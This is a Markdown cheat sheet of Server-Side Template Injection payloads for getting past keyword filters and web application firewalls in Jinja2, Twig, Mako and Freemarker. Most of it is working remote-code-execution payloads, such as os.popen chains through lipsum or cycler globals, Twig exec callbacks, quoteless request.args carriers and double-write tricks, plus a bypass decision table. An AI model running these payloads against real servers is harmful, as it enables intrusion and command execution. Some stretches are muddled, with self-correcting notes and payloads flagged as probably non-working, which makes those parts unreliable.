# SSTI - Filter/WAF Bypass Techniques

## String Concatenation to Avoid Blocklisted Keywords

### Jinja2/Python
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ [].__class__.__base__.__subclasses__() }}
{{ request['application']['__globals__']['__builtins__'] }}
{{ "sy"+"stem" }}           # Won't work directly, need attribute chains
{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
```

### Bypass Underscore Filter
```
{{ request|attr("__class__") }}
{{ request['__class__'] }}
{% set x = "__cla" + "ss__" %}{{ request[x] }}
```

### Bypass Quote Filter (use string concatenation without quotes)
```
{{ request[dict(__class__=1).keys()|join] }}
```

## Twig
```
{{['id']|filter('sy'~'stem')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
```

## Freemarker
```
<#assign val="fr"+"eemarker.template.utility.Execute"?new()>${val("id")}
```

## General Encoding Bypass Techniques

### Unicode Normalization
```
{{7*7}}                → Basic
{{7\u002a7}}           → Unicode escaped operator (context-dependent)
```

### Case Variation (rarely effective, but test)
```
{{REQUEST}}
{{Request}}
```

### Whitespace/Comment Injection
```
{{7*7}}
{#comment#}{{7*7}}
{{ 7 * 7 }}            # Extra spaces
```

### Alternative Delimiters (if primary blocked)
```
${...}     Freemarker/older Velocity
#{...}     Some engines
{{...}}    Jinja2/Twig/Django
<%...%>    ERB/JSP
```

## WAF Bypass via Nested Expressions
```
{{ self|attr('_TemplateReference__context')|attr('cycler')... }}
```

## Length-Restricted Payload (short WAF-evading Jinja2 RCE)
```
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

## Detection Bypass (avoid obvious math when testing)
```
{{ 'a'.join(['','']) }}     # Non-math test to avoid pattern-based WAF
{{ config }}                 # Flask config object dump - if reflected, confirms Jinja2
```

## Testing Strategy
```
1. Start with basic {{7*7}} - if blocked, try alternate delimiters/encoding
2. If keyword filtered (e.g. "class", "system", "import"), use concatenation/attr()
3. If quotes filtered, use dict().keys()|join or request.args to avoid quotes
4. If length-limited, use short built-in globals (lipsum, cycler, joiner, namespace)
5. Check WAF response for which specific keyword triggered block
```

---

## Comprehensive filter-bypass taxonomy

SSTI filters fail in predictable ways — the value is checked as a
STRING against a keyword list, but the engine EVALUATES it. Build
the blocked string from pieces the filter can't match.

### Keyword-splitting — every engine's way

```jinja2
{# Jinja2 — concat, attr(), request-args: #}
{{''|attr('__cl'+'ass__')}}
{{''['__cl'+'ass__']}}
{{''['__cla'~'ss__']}}                    -- ~ is Jinja concat
{{''|attr(request.args.a)}}&a=__class__    -- string via param
{{''['__class__']}}
{% set a='__cl'%}{% set b='ass__'%}{{''[a~b]}}   -- set-concat
{{''['\x5f\x5fclass\x5f\x5f']}}            -- hex escapes in string
{{''['\u005f\u005fclass\u005f\u005f']}}    -- unicode escapes
{{''['__class__']|list}}                   -- via filter chains
```

```twig
{{['id']|map('sys'~'tem')}}              -- Twig concat ~
{{_self.env.registerUndefinedFilterCallback('ex'~'ec')}}
{{['id']|map(app.request.query.get('f'))}}&f=system
```

```mako
${getattr('','__cl'+'ass__')}
${getattr(__import__('im'+'portlib'),'import_mod'+'ule')('o'+'s')}
```

### Quoteless strings — when `'`/`"` die

```jinja2
{{request.args.x}}                        -- pass strings as params
   &x=__class__&y=__mro__...
{{request.values.x}}                      -- GET+POST merged
{{request.cookies.x}}                     -- cookies too
{{request.headers.x}}                     -- headers!
{{request.form.x}}                        -- POST form

{# dict-keys trick — build strings from dict keys: #}
{{dict(__class__=x)|join}}                 -- key 'nope' wait:
{{dict(__class__=x)|list|first}}           -- the KEY as string:
{{dict(__class__=x).keys()|join}}          -- '__class__' as string!
{{dict(a=1,b=2).keys()|join}}              -- 'ab' — build chars
{{dict(base=1)|attr('keys')()|list}}       -- keys list
```

The `dict(k=v).keys()|join` trick: dict keys ARE strings —
`{{dict(__class__=x)|list|first}}` yields the string `__class__`
with NO quotes in the payload.

### Number/char building — `lorem ipsum` base strings

```jinja2
{{lipsum}}                                  -- lorem text source
{{lipsum[0]}}                                -- 'L'
{{lipsum|string|first}}                      -- 'L'
{{lipsum|string|list}}                       -- char list
   -- build 'os' etc. from lipsum chars via indexes
{{url_for|string|list}}                       -- function repr chars
{{config|string|list}}                         -- config repr
{{'%~a%'|format(x)}}                            -- format spec
{{'%%c'|format(97)}}                             -- chr(97)='a'
{{'%c'|format(97)}}                               -- 'a' via format
{{format(97,'c')}}                                 -- format builtin
```

`'%c'|format(N)` is the chr-builder — `'%c'|format(95)` = `_` —
build `__class__` char by char when the string is filtered.

### Underscore building — `__` is almost always blocked

```jinja2
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr('\u005f\u005fclass\u005f\u005f')}}
{{''|attr(request.args.a)}}&a=__class__
{{''[dict(__class__=x)|list|first]}}
{{''|attr('_'*2+'class'+'_'*2)}}           -- * for repetition
{{''|attr('__cla'+'ss__')}}
{{namespace['__init__']}}                   -- some ctx has direct
{{lipsum['__globals__']}}
```

### The `request.args` carrier — cleanest bypass

Every string the payload needs comes through query params — the
payload contains NO quoted strings at all:

```jinja2
?q={{''|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
?q={{request.args.f(request.args.a)}}&f=eval&a=__import__('os').popen('id').read()
```

`request.args` / `request.values` / `request.cookies` /
`request.form` / `request.headers` — all carrier channels.

### Filter-eats-only-FIRST-occurrence

```jinja2
{{''.__cla__class__ss__}}      -- filter removes '__class__' once →
                                leaves '__class__'... wait no:
                                '__cla__class__ss__' contains
                                '__class__' — removing it leaves
                                '__class__'? '__cla'+'__class__'+'ss__'
                                remove middle '__class__' → '__class__'
                                -- yes! the classic double-write
{{''.__class____class__}}      -- if filter scans once l→r:
                                remove first '__class__' → '__class__'!
{{''.__clclassass__}}          -- split differently
{{''.____clclaaassssss__}}     -- doubled letters variant
```

The double-write trick: embed the blocked string inside itself
such that removing the FIRST match leaves a valid copy behind.

### Attribute-access alternatives — `.` filtered

```jinja2
{{''['__class__']}}              -- [] instead of .
{{''|attr('__class__')}}          -- attr filter
{{''|attr('_'*2+'class'+'_'*2)}}
{{request|attr('args')}}          -- attr on objects
{{request['args']}}
{{getattr('','__class__')}}       -- getattr builtin if exposed
{{x.__getitem__('y')}}            -- method-call form
{{x|attr('y')}}
```

### Function-call alternatives — `()` filtered

```jinja2
{{''['__class__']['__mro__'][-1]['__subclasses__']()}}   -- () needed
   -- if () themselves blocked:
{{lipsum.__globals__}}            -- attr-chains without calls —
                                  then list/dict access:
{{lipsum.__globals__['os']}}      -- but os.popen needs ()...
{{lipsum.__globals__.os.popen(request.args.c).read()}}&c=id
   -- () in the PAYLOAD are unavoidable for calling — instead
      check if the filter blocks () or CALLABLES
   -- if ( ) filtered → use request.args with the CALL encoded:
      {{x|attr(request.args.m)}}&m=popen — the method name arrives
      but the CALL still needs () — dead unless eval-on-string:
      {{request.args.c|eval}}     -- eval filter? jinja has no eval filter
      {{'%s'|format(x)}}           -- format needs ()
```

If literal `()` is filtered, options shrink — the `request.args`
trick keeps strings alive but calls still need `()`. Alternative:
find a bound CALLABLE attr the app exposes (`url_for`, `render`).

### Comment-injection — `{#`/`{#` breaking strings

```jinja2
{{''|attr('__cla{#x#}ss__')}}     -- comment INSIDE the name — the
                                   comment strips → '__class__'
                                   only if filter runs BEFORE
                                   template-parse — usually the
                                   opposite: filter sees the raw
                                   string → '_cla{#x#}ss_' ≠
                                   '__class__' → passes; then
                                   engine strips {#x#} → works
{{'__class__'|replace('{#','')|replace('#}','')}}  -- reverse
```

Comments inside identifiers are a real bypass when the filter
runs on the raw payload before the template engine strips them.

### The `{%`/`{{` mixing — split delimiters

```jinja2
{%set x='__class__'%}{{''[x]}}
{%set a='os'%}{%set b='popen'%}{{lipsum.__globals__[a][b]('id').read()}}
{%if 1%}...{%endif%}               -- if-wrapped payload — if {{}}
                                    filtered but {%} passes
{%print(eval)%}
```

When `{{}}` is stripped but `{% %}` survives — `{%print%}` or
if/for-wrapped expressions.

### Engine-expression inside filtered-tag — delimiter mutation

```jinja2
{% raw %}{{x}}{% endraw %}        -- if input lands where {% raw %}
                                    wrapping changes eval — not
                                    exploitable, listed to explain
                                    why {%raw%} can NEUTRALIZE you
{{'{#x#}'}}                        -- literal-comment confusion
```

---

## The `ssti-bypass` decision table

| Blocked | First try |
|---|---|
| `__` | `\x5f\x5f` / `request.args` / `dict(__x__=k).keys()` |
| quotes | `request.args` carrier / `dict(k=v).keys()` strings |
| `class`/`import`/`os` | split concat / hex in string / `getattr` |
| `.` | `['x']` / `\|attr('x')` |
| `(` `)` | method-name via args — but calls still need `()` — pivot to attr-chains returning readables (config dump) |
| `{{}}` | `{% %}` + `{%print%}` / `{%if x%}...{%endif%}` wrapped expr |
| `{% %}` | `{{}}`-only expressions — no statements available |
| `keywords` | encode in params — `request.args` carries the string |
| `letters` | `dict(k=v)` keys / `'%c'\|format(N)` chr() / charset tricks |
| `spaces` | `\t`/`%0a` inside tags / `/**/` no — Jinja needs real ws |
| `length` | split across `{%set%}` statements / param-carried strings |
| `num` | `'x'\|length` math — `{{7*'0'}}` string-mul arithmetic |
| `=` | `{%set x%}...{%endset%}` block-set — no `=` needed |

## Chained bypass — when three things are filtered at once

```jinja2
{{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)
  |attr(request.args.d)(request.args.e)}}
  &a=__globals__&b=__getitem__&c=os&d=popen&e=id
```

Every dangerous token arrives via `request.args` — the template
literal is only `lipsum|attr()` + bracket syntax. Layering:

1. Which delimiters survive? → test `{{x}}`, `{%x%}`, `{#x#}` each
2. Which accessor survives? → `.`, `['x']`, `|attr('x')`
3. Which string-carrier survives? → quotes, `request.args`, `dict()`
4. Which sink-object is bound? → `lipsum` > `self` > `config` >
   `request` > `cycler`/`joiner`/`namespace`

Compose the three surviving choices — the payload is the product.

